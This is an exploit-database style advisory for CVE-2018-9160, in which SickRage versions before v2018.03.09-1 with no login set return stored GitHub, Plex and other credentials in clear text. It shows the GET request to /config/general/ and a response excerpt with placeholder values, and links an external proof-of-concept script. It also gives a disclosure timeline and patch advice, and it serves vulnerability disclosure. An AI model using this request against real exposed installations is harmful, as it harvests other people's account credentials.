# Sickrage cleartext github credentials CVE-2018-9160
---------------------------------------------------------------------

1. About

---------------------------------------------------------------------
Exploit Title: SickRage Clear-Text Credentials in HTTP Response  
Date: 2018-04-01  
Exploit Author: Sven Fassbender  
Contact: https://twitter.com/mezdanak  
Vendor Homepage: https://sickrage.github.io  
Software Link: https://github.com/SickRage/SickRage  
Version: < v2018.03.09-1  
CVE : CVE-2018-9160  
Category: webapps  

---------------------------------------------------------------------

2. Background information

---------------------------------------------------------------------
"SickRage is an automatic Video Library Manager for TV Shows.  
It watches for new episodes of your favourite shows, and when they are posted it does its magic:   
automatic torrent/nzb searching, downloading, and processing at the qualities you want." --extract from https://sickrage.github.io  

---------------------------------------------------------------------

3. Vulnerability description

---------------------------------------------------------------------
SickRage returns clear-text credentials for e.g. GitHub, AniDB, Kodi, Plex etc. in HTTP responses.  
Prerequisite is that the user did not set a username and password for their SickRage installation. (not enforced, default)  
  
HTTP request:  

```html
GET /config/general/ HTTP/1.1  
Host: 192.168.1.13:8081  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: de,en-US;q=0.7,en;q=0.3  
Accept-Encoding: gzip, deflate  
Referer: http://192.168.1.13:8081/config/backuprestore/  
DNT: 1  
Connection: close  
Upgrade-Insecure-Requests: 1  
```
  
  
HTTP response:  

```html
HTTP/1.1 200 OK  
Content-Length: 113397  
Vary: Accept-Encoding  
Server: TornadoServer/4.5.1  
Etag: "e5c29fe99abcd01731bec1afec0e618195f1ae37"  
Date: Fri, 02 Mar 2018 10:47:51 GMT  
Content-Type: text/html; charset=UTF-8  

<!DOCTYPE html>  
<html lang="nl_NL">  
    <head>  
		[...]  
        <input type="text" name="git_username" id="git_username" value="email@example.com" class="form-control input-sm input300" autocapitalize="off" autocomplete="no" />  
        [...]  
        <input type="password" name="git_password" id="git_password" value="supersecretpassword" class="form-control input-sm input300" autocomplete="no" autocapitalize="off" />  
		[...]  
        </div>  
    </body>  
</html>  
```

---------------------------------------------------------------------

4. Proof of Concept

---------------------------------------------------------------------
https://github.com/mechanico/sickrageWTF/blob/master/get_github_creds_sickrage.py  

---------------------------------------------------------------------

5. Timeline

---------------------------------------------------------------------
[2018-03-07] Vulnerability discovered  
[2018-03-08] Vendor contacted  
[2018-03-08] Vendor replied  
[2018-03-09] Vulnerability fixed. (https://github.com/SickRage/SickRage/compare/v2018.02.26-2...v2018.03.09-1)  
  
---------------------------------------------------------------------

6. Recommendation

---------------------------------------------------------------------
Update the SickRage installation on v2018.03.09-1 or later.  
Protect the access to the web application with proper user credentials.  
  
---------------------------------------------------------------------
